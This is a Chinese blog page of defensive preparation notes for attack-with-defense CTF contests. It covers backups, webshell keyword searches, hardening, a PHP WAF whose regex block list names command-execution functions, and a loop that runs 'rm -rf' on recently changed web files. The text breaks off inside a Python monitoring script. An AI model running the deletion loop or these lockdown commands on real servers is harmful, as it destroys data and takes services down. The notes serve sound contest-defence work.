<!DOCTYPE html><html lang=zh-CN data-default-color-scheme=auto><head><meta charset=UTF-8><link rel=apple-touch-icon sizes=76x76 href=/img/favicon/favicon.png><link rel=icon href=/img/favicon/favicon.png><link rel=canonical href="https://justloseit.top/AWD 赛前准备/"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content=#2f4154><meta name=author content="Mobilis In Mobili"><meta name=keywords content=""><meta name=description content="之前从未打过 AWD 的比赛，这次准备时把网上的资料整理了一下"><meta property=og:type content=article><meta property=og:title content="AWD 赛前准备"><meta property=og:url content=https://justloseit.top/AWD%20%E8%B5%9B%E5%89%8D%E5%87%86%E5%A4%87/index.html><meta property=og:site_name content=动中之动><meta property=og:description content="之前从未打过 AWD 的比赛，这次准备时把网上的资料整理了一下"><meta property=og:locale content=zh_CN><meta property=og:image content=https://justloseit.top/img/index/AWD%20%E8%B5%9B%E5%89%8D%E5%87%86%E5%A4%87.jpg><meta property=article:published_time content=2021-07-10T09:27:04.000Z><meta property=article:modified_time content=2022-11-22T04:25:29.182Z><meta property=article:author content="Mobilis In Mobili"><meta property=article:tag content=CTF><meta property=article:tag content=AWD><meta name=twitter:card content=summary_large_image><meta name=twitter:image content=https://justloseit.top/img/index/AWD%20%E8%B5%9B%E5%89%8D%E5%87%86%E5%A4%87.jpg><title>AWD 赛前准备 - 动中之动</title><link rel=stylesheet href=https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css><link rel=stylesheet href=https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css><link rel=stylesheet href=https://lib.baomitu.com/hint.css/2.7.0/hint.min.css><link rel=stylesheet href=https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css><link rel=stylesheet href=//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css><link rel=stylesheet href=//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css><link rel=stylesheet href=/css/main.css><link id=highlight-css rel=stylesheet href=/css/highlight.css><link id=highlight-css-dark rel=stylesheet href=/css/highlight-dark.css><script id=fluid-configs>var dntVal,Fluid=window.Fluid||{},CONFIG=(Fluid.ctx=Object.assign({},Fluid.ctx),{hostname:"justloseit.top",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:60,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:"§"},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!1,baidu:null,google:{measurement_id:null},tencent:{sid:null,cid:null},leancloud:{app_id:"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz",app_key:"x2YseXJIHmvnsM4v9y9UAlvu",server_url:"https://sni2xnrh.lc-cn-n1-shared.com",path:"window.location.pathname",ignore_local:!1},umami:{src:null,website_id:null,domains:null,start_time:"2024-01-01T00:00:00.000Z",token:null,api_server:null}},search_path:"/local-search.xml",include_content_in_search:!0});CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src=/js/utils.js></script><script src=/js/color-schema.js></script><meta name=generator content="Hexo 5.4.2"><link rel=alternate href=/atom.xml title=动中之动 type=application/atom+xml></head><body><header><div class=header-inner style=height:70vh><nav id=navbar class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class=container><a class=navbar-brand href=/ ><strong>Mobilis In Mobili</strong> </a><button id=navbar-toggler-btn class=navbar-toggler type=button data-toggle=collapse data-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation"><div class=animated-icon><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav ml-auto text-center"><li class=nav-item><a class=nav-link href=/ target=_self><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class=nav-item><a class=nav-link href=/archives/ target=_self><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class=nav-item><a class=nav-link href=/categories/ target=_self><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class=nav-item><a class=nav-link href=/tags/ target=_self><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class=nav-item><a class=nav-link href=/about/ target=_self><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class=nav-item><a class=nav-link href=/links/ target=_self><i class="iconfont icon-link-fill"></i> <span>友链</span></a></li><li class=nav-item id=search-btn><a class=nav-link target=_self href=javascript:; data-toggle=modal data-target=#modalSearch aria-label=Search><i class="iconfont icon-search"></i></a></li><li class=nav-item id=color-toggle-btn><a class=nav-link target=_self href=javascript:; aria-label="Color Toggle"><i class="iconfont icon-dark" id=color-toggle-icon></i></a></li></ul></div></div></nav><div id=banner class=banner parallax=true style="background:url(/img/banner/AWD%20%E8%B5%9B%E5%89%8D%E5%87%86%E5%A4%87.jpg) no-repeat center center;background-size:cover"><div class=full-bg-img><div class="mask flex-center" style=background-color:rgba(0,0,0,.3)><div class="banner-text text-center fade-in-up"><div class=h2><span id=subtitle data-typed-text="AWD 赛前准备"></span></div><div class=mt-3><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden=true></i> Mobilis In Mobili </span><span class=post-meta><i class="iconfont icon-date-fill" aria-hidden=true></i> <time datetime="2021-07-10 17:27" pubdate>2021年7月10日 下午</time></span></div><div class=mt-1><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 4k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 34 分钟 </span><span id=leancloud-page-views-container class=post-meta style=display:none><i class="iconfont icon-eye" aria-hidden=true></i> <span id=leancloud-page-views></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id=board-ctn><div id=board><article class="post-content mx-auto"><h1 id=seo-header>AWD 赛前准备</h1><p id=updated-time class="note note-info">本文最后更新于 2022年11月22日 中午</p><div class=markdown-body><p>之前从未打过 AWD 的比赛，这次准备时把网上的资料整理了一下</p><span id=more></span><h1 id=awd-赛前准备><a class=markdownIt-Anchor href=#awd-赛前准备></a> AWD 赛前准备</h1><h2 id=awd-规则><a class=markdownIt-Anchor href=#awd-规则></a> AWD 规则</h2><ol><li>一般分配Web服务器，服务器<strong>某处存在flag</strong>，一般为<strong>根目录</strong>；</li><li>flag 在主办方设定下每隔一段时间会<strong>刷新</strong>；</li><li>各队具有初试分数；</li><li>flag 一旦被其他队伍获得，该队扣除一定积分，扣除的积分有获取 flag 的队伍<strong>均分</strong>；</li><li>主办方会对每个队伍的服务进行 check，服务器<strong>宕机</strong>扣除本轮 flag 分数，扣除的分值由 check 正常的队伍均分；</li><li>一般每个队伍会给予一个低权限用户，<strong>而非 root</strong>；</li></ol><h2 id=线下环境准备><a class=markdownIt-Anchor href=#线下环境准备></a> 线下环境准备</h2><ul><li>比赛前主办方可能提供<strong>网络拓扑</strong><ul><li>攻击机、靶机、check 服务器</li></ul></li></ul><h2 id=题目类型><a class=markdownIt-Anchor href=#题目类型></a> 题目类型</h2><ol><li>语言：多数 php，少数 Java、Python；</li><li>出题人写的 cms，添加上对应的漏洞点；</li><li>一些框架漏洞（thinkphp、MVC）；</li></ol><h2 id=防御><a class=markdownIt-Anchor href=#防御></a> 防御</h2><h3 id=备份><a class=markdownIt-Anchor href=#备份></a> 备份</h3><ol><li><p>目录打包</p><ul><li><p>打包</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">tar -zcvf archive_name.tar.gz  directory_to_compress<br></code></pre></td></tr></table></figure><ul><li><p>备份整站</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-built_in>cd</span> /var/www &amp;&amp; tar -czvf /tmp/html.tgz html<br><span class=hljs-comment># 软连接到了/app</span><br><span class=hljs-built_in>cd</span> / &amp;&amp; tar -czvf /tmp/app.tgz app<br></code></pre></td></tr></table></figure></li></ul></li><li><p>解包</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">tar -zxvf archive_name.tar.gz<br></code></pre></td></tr></table></figure></li></ul></li><li><p>数据库</p><ul><li><p>备份指定的多个数据库</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br></code></pre></td></tr></table></figure><ul><li><p><strong>无 lock tables 权限</strong>的解决方法</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br></code></pre></td></tr></table></figure></li></ul></li><li><p>恢复备份（在 MySQL 终端下执行）</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs mysql">source FILE_PATH<br></code></pre></td></tr></table></figure></li><li><p>重置 MySQL 密码（在 MySQL 终端下执行）</p><ul><li><p>方法 1</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs mysql">set password for 用户名@localhost = password(&quot;新密码&quot;)<br></code></pre></td></tr></table></figure></li><li><p>方法 2</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs mysql">mysqladmin -u用户名 -p旧密码 password 新密码<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>下载到本地</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">scp -P ssh_port user@host_ip:/tmp/bak.sql local_file<br></code></pre></td></tr></table></figure></li></ol><h3 id=基础查杀><a class=markdownIt-Anchor href=#基础查杀></a> 基础查杀</h3><ol><li><p>寻找<strong>最近20分钟</strong>修改过的文件</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">find /var/www/html -name *.php -mmin -20<br></code></pre></td></tr></table></figure></li><li><p>寻找<strong>行数最短</strong>的文件：</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">find ./ -name <span class=hljs-string>&#x27;*.php&#x27;</span> | xargs <span class=hljs-built_in>wc</span> -l | <span class=hljs-built_in>sort</span> -u<br></code></pre></td></tr></table></figure></li><li><p>拿到源码后使用<strong>D盾查杀</strong>——可以找到<strong>位置不明显</strong>的 webshell</p></li><li><p>Seay 源代码审计系统</p></li><li><p>检查系统安全性：关闭无需开放的端口、检查弱口令、mysql默认密码、是否做了SSH登录限制</p><ul><li><p>端口</p><ul><li><p>查看端口</p><ul><li>方法 1</li></ul><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># -n 直接使用IP地址</span><br><span class=hljs-comment># -a 所有连线中的Socket</span><br><span class=hljs-comment># -p programs 显示正在使用Socket的程序识别码和程序名称</span><br><span class=hljs-comment># -t 显示TCP传输协议的连线状况</span><br>netstat -napt<br></code></pre></td></tr></table></figure><ul><li>方法 2</li></ul><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">lsof -i:port <br></code></pre></td></tr></table></figure></li><li><p>杀掉进程</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-built_in>kill</span> -9 PID<br></code></pre></td></tr></table></figure></li></ul></li><li><p>SSH 修改密码</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># SSH登录后执行</span><br>passwd<br></code></pre></td></tr></table></figure></li></ul></li><li><p>修改权限</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># 用chattr命令防止系统中某个关键文件被修改：</span><br>chattr +i /etc/resolv.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># 删除file的所有用户的执行权限</span><br><span class=hljs-built_in>chmod</span> -R a-x file<br></code></pre></td></tr></table></figure></li><li><p>关键字查杀</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><code class="hljs bash">find . -name <span class=hljs-string>&#x27;*.php&#x27;</span> | xargs grep -n <span class=hljs-string>&#x27;eval(&#x27;</span><br>find . -name <span class=hljs-string>&#x27;*.php&#x27;</span> | xargs grep -n <span class=hljs-string>&#x27;assert&#x27;</span><br>find . -name <span class=hljs-string>&#x27;*.php&#x27;</span> | xargs grep -n <span class=hljs-string>&#x27;system()&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>重置web的各种登录密码，但是<strong>有被check的风险</strong></p></li></ol><h3 id=修改-curl><a class=markdownIt-Anchor href=#修改-curl></a> 修改 curl</h3><ul><li>因为获取 flag 一般是 <code>curl http://xxx.com/flag.txt​</code></li></ul><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-built_in>alias</span> curl=<span class=hljs-string>&#x27;echo fuckoff&#x27;</span> <span class=hljs-comment>#权限要求较低，可以在这里改成虚假的flag</span><br><span class=hljs-comment># 或者</span><br><span class=hljs-built_in>chmod</span> -x curl <span class=hljs-comment>#权限要求较高</span><br>/usr/bin curl路径<br></code></pre></td></tr></table></figure><h3 id=漏洞修复><a class=markdownIt-Anchor href=#漏洞修复></a> 漏洞修复</h3><ul><li><p>基本原则</p><ol><li>能修复的尽量修复；</li><li>不能修复的先<strong>注释源码</strong>，不影响页面显示再删除；</li><li>站点和对应的功能尽可能不宕机；</li></ol></li><li><p>技巧</p><ol><li>设置 waf，如 <code>load_file</code>；</li><li>对于一些成型的 CMS，找到相应版本号后，对其 <code>diff</code>；</li><li>修改弱口令用户；</li><li>对于<strong>觉得危险函数</strong>的地方直接使用<code>die()</code>；</li></ol></li></ul><h3 id=waf><a class=markdownIt-Anchor href=#waf></a> WAF</h3><ul><li><p>过滤参数，但是过于严格<strong>有可能宕机</strong></p></li><li><p>使用方法：</p><ol><li>在每个文件前加上代码，在 <code>php.ini</code> 中找到<code>auto_prepend_file = waf.php</code>；</li><li>防护页面加上 <code>require_one('waf.php')</code>；</li></ol><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-built_in>sudo</span> find /var/www/html/path_you_want -<span class=hljs-built_in>type</span> f -path <span class=hljs-string>&quot;*.php&quot;</span> | xargs sed -i <span class=hljs-string>&quot;s/&lt;?php /&lt;?php\nrequire_once(&#x27;\/tmp\/waf.php&#x27;);\n/g&quot;</span><br></code></pre></td></tr></table></figure><ol start=3><li><a target=_blank rel=noopener href=https://github.com/leohearts>leohearts</a>/<strong><a target=_blank rel=noopener href=https://github.com/leohearts/awd-watchbird>awd-watchbird</a></strong>、<a target=_blank rel=noopener href=https://github.com/DasSecurity-HatLab>DasSecurity-HatLab</a>/<strong><a target=_blank rel=noopener href=https://github.com/DasSecurity-HatLab/AoiAWD>AoiAWD</a></strong>、<a target=_blank rel=noopener href=https://github.com/sharpleung>sharpleung</a>/<strong><a target=_blank rel=noopener href=https://github.com/sharpleung/CTF-WAF>CTF-WAF</a></strong></li><li>常用 PHP 系统添加 WAF</li></ol><table><thead><tr><th style=text-align:center>php 系统</th><th style=text-align:center>waf 位置</th></tr></thead><tbody><tr><td style=text-align:center>PHPCMS V9</td><td style=text-align:center>\phpcms\base.php</td></tr><tr><td style=text-align:center>PHPWIND8.7</td><td style=text-align:center>\data\sql_config.php</td></tr><tr><td style=text-align:center>DEDECMS5.7</td><td style=text-align:center>\data\common.inc.php</td></tr><tr><td style=text-align:center>DescuzX2</td><td style=text-align:center>\config\config_global.php</td></tr><tr><td style=text-align:center>DEDECMS5.7</td><td style=text-align:center>\wp-config.php</td></tr><tr><td style=text-align:center>Meinfov</td><td style=text-align:center>\include\head.php</td></tr></tbody></table></li><li><p>如果不能部署 waf，可以配置 apache 禁止 PHP 执行，<strong>很可能被 check</strong></p><figure class="highlight html"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br></pre></td><td class=code><pre><code class="hljs html"><span class=hljs-tag>&lt;<span class=hljs-name>Directory</span> &quot;/<span class=hljs-attr>var</span>/<span class=hljs-attr>www</span>/<span class=hljs-attr>html</span>/&quot;&gt;</span><br>Options -ExecCGI -Indexes<br>AllowOverride None<br>RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml<br>RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml<br>php_flag engine off<br><span class=hljs-tag>&lt;<span class=hljs-name>FilesMatch</span> &quot;<span class=hljs-attr>.</span>+\<span class=hljs-attr>.ph</span>(<span class=hljs-attr>p</span>[<span class=hljs-attr>3457</span>]?|<span class=hljs-attr>t</span>|<span class=hljs-attr>tml</span>)$&quot;&gt;</span><br>deny from all<br><span class=hljs-tag>&lt;/<span class=hljs-name>FilesMatch</span>&gt;</span><br><span class=hljs-tag>&lt;/<span class=hljs-name>Directory</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>一个 WAF 的例子</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br><span class=line>26</span><br><span class=line>27</span><br><span class=line>28</span><br><span class=line>29</span><br><span class=line>30</span><br><span class=line>31</span><br><span class=line>32</span><br><span class=line>33</span><br><span class=line>34</span><br><span class=line>35</span><br><span class=line>36</span><br><span class=line>37</span><br><span class=line>38</span><br><span class=line>39</span><br><span class=line>40</span><br><span class=line>41</span><br><span class=line>42</span><br><span class=line>43</span><br><span class=line>44</span><br><span class=line>45</span><br><span class=line>46</span><br><span class=line>47</span><br><span class=line>48</span><br><span class=line>49</span><br><span class=line>50</span><br><span class=line>51</span><br><span class=line>52</span><br><span class=line>53</span><br><span class=line>54</span><br><span class=line>55</span><br><span class=line>56</span><br><span class=line>57</span><br><span class=line>58</span><br><span class=line>59</span><br><span class=line>60</span><br><span class=line>61</span><br><span class=line>62</span><br><span class=line>63</span><br><span class=line>64</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class=hljs-number>0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class=hljs-string>&#x27;LOG_FILENAME&#x27;</span>, <span class=hljs-string>&#x27;log.txt&#x27;</span>); <br><span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>waf</span>(<span class=hljs-params></span>) </span>&#123;<br>    <span class=hljs-keyword>if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class=hljs-string>&#x27;getallheaders&#x27;</span>)) &#123;<br>        <span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>getallheaders</span>(<span class=hljs-params></span>) </span>&#123;<br>            <span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$_SERVER</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$name</span> =&gt; <span class=hljs-variable>$value</span>) &#123;<br>                <span class=hljs-keyword>if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class=hljs-variable>$name</span>, <span class=hljs-number>0</span>, <span class=hljs-number>5</span>) == <span class=hljs-string>&#x27;HTTP_&#x27;</span>) <span class=hljs-variable>$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class=hljs-string>&#x27; &#x27;</span>, <span class=hljs-string>&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class=hljs-string>&#x27;_&#x27;</span>, <span class=hljs-string>&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class=hljs-variable>$name</span>, <span class=hljs-number>5</span>))))) ] = <span class=hljs-variable>$value</span>;<br>            &#125;<br>            <span class=hljs-keyword>return</span> <span class=hljs-variable>$headers</span>;<br>        &#125;<br>    &#125;<br>    <span class=hljs-variable>$get</span> = <span class=hljs-variable>$_GET</span>;<br>    <span class=hljs-variable>$post</span> = <span class=hljs-variable>$_POST</span>;<br>    <span class=hljs-variable>$cookie</span> = <span class=hljs-variable>$_COOKIE</span>;<br>    <span class=hljs-variable>$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>    <span class=hljs-variable>$files</span> = <span class=hljs-variable>$_FILES</span>;<br>    <span class=hljs-variable>$ip</span> = <span class=hljs-variable>$_SERVER</span>[<span class=hljs-string>&quot;REMOTE_ADDR&quot;</span>];<br>    <span class=hljs-variable>$method</span> = <span class=hljs-variable>$_SERVER</span>[<span class=hljs-string>&#x27;REQUEST_METHOD&#x27;</span>];<br>    <span class=hljs-variable>$filepath</span> = <span class=hljs-variable>$_SERVER</span>[<span class=hljs-string>&quot;SCRIPT_NAME&quot;</span>];<br>    <span class=hljs-comment>//rewirte shell which uploaded by others, you can do more</span><br>    <span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$_FILES</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$key</span> =&gt; <span class=hljs-variable>$value</span>) &#123;<br>        <span class=hljs-variable>$files</span>[<span class=hljs-variable>$key</span>][<span class=hljs-string>&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class=hljs-variable>$_FILES</span>[<span class=hljs-variable>$key</span>][<span class=hljs-string>&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class=hljs-variable>$_FILES</span>[<span class=hljs-variable>$key</span>][<span class=hljs-string>&#x27;tmp_name&#x27;</span>], <span class=hljs-string>&quot;virink&quot;</span>);<br>    &#125;<br>    <span class=hljs-keyword>unset</span>(<span class=hljs-variable>$header</span>[<span class=hljs-string>&#x27;Accept&#x27;</span>]); <span class=hljs-comment>//fix a bug</span><br>    <span class=hljs-variable>$input</span> = <span class=hljs-keyword>array</span>(<br>        <span class=hljs-string>&quot;Get&quot;</span> =&gt; <span class=hljs-variable>$get</span>,<br>        <span class=hljs-string>&quot;Post&quot;</span> =&gt; <span class=hljs-variable>$post</span>,<br>        <span class=hljs-string>&quot;Cookie&quot;</span> =&gt; <span class=hljs-variable>$cookie</span>,<br>        <span class=hljs-string>&quot;File&quot;</span> =&gt; <span class=hljs-variable>$files</span>,<br>        <span class=hljs-string>&quot;Header&quot;</span> =&gt; <span class=hljs-variable>$header</span><br>    );<br>    <span class=hljs-comment>//deal with</span><br>    <span class=hljs-variable>$pattern</span> = <span class=hljs-string>&quot;select|insert|update|delete|and|or|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>    <span class=hljs-variable>$pattern</span>.= <span class=hljs-string>&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>    <span class=hljs-variable>$pattern</span>.= <span class=hljs-string>&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>    <span class=hljs-variable>$pattern</span>.= <span class=hljs-string>&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>    <span class=hljs-variable>$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class=hljs-string>&quot;|&quot;</span>, <span class=hljs-variable>$pattern</span>);<br>    <span class=hljs-variable>$bool</span> = <span class=hljs-literal>false</span>;<br>    <span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$input</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$k</span> =&gt; <span class=hljs-variable>$v</span>) &#123;<br>        <span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$vpattern</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$value</span>) &#123;<br>            <span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$v</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$kk</span> =&gt; <span class=hljs-variable>$vv</span>) &#123;<br>                <span class=hljs-keyword>if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class=hljs-string>&quot;/<span class=hljs-subst>$value</span>/i&quot;</span>, <span class=hljs-variable>$vv</span>)) &#123;<br>                    <span class=hljs-variable>$bool</span> = <span class=hljs-literal>true</span>;<br>                    <span class="hljs-title function_ invoke__">logging</span>(<span class=hljs-variable>$input</span>);<br>                    <span class=hljs-keyword>break</span>;<br>                &#125;<br>            &#125;<br>            <span class=hljs-keyword>if</span> (<span class=hljs-variable>$bool</span>) <span class=hljs-keyword>break</span>;<br>        &#125;<br>        <span class=hljs-keyword>if</span> (<span class=hljs-variable>$bool</span>) <span class=hljs-keyword>break</span>;<br>    &#125;<br>&#125;<br><span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>logging</span>(<span class=hljs-params><span class=hljs-variable>$var</span></span>) </span>&#123;<br> <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class=hljs-string>&quot;Asia/Shanghai&quot;</span>);<span class=hljs-comment>//修正时间为中国准确时间</span><br> <span class=hljs-variable>$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class=hljs-string>&quot;Y-m-d H:i:s&quot;</span>);<span class=hljs-comment>//将时间赋值给变量 $time</span><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(LOG_FILENAME, <span class=hljs-string>&quot;\r\n\r\n\r\n&quot;</span> . <span class=hljs-variable>$time</span> . <span class=hljs-string>&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">print_r</span>(<span class=hljs-variable>$var</span>, <span class=hljs-literal>true</span>) , FILE_APPEND);<br>    <span class=hljs-comment>// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span><br>    <br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class=hljs-meta>?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ul><h3 id=文件监控><a class=markdownIt-Anchor href=#文件监控></a> 文件监控</h3><ul><li>Shell 监控新增文件，创建文件的时候更改文件创建时间<strong>可能监测不到</strong></li></ul><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># 循环监听一小时以内更改过的文件或新增的文件，进行删除。</span><br><span class=hljs-comment>#!/bin/bash</span><br><span class=hljs-keyword>while</span> <span class=hljs-literal>true</span><br><span class=hljs-keyword>do</span><br>    find /var/www/dvwa/ -cmin -60 -<span class=hljs-built_in>type</span> f | xargs <span class=hljs-built_in>rm</span> -rf<br>    <span class=hljs-built_in>sleep</span> 1<br><span class=hljs-keyword>done</span><br></code></pre></td></tr></table></figure><ul><li>Python 监测新增文件：放在 <code>/var/www/</code> 或 <code>/var/www/html</code> 下执行这个脚本，它会先备份当前目录下的所有文件，然后监控当前目录，一旦当前目录下的某个文件发生变更，就会<strong>自动还原</strong>，有新的文件产生就会<strong>自动删除</strong>。</li></ul><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span 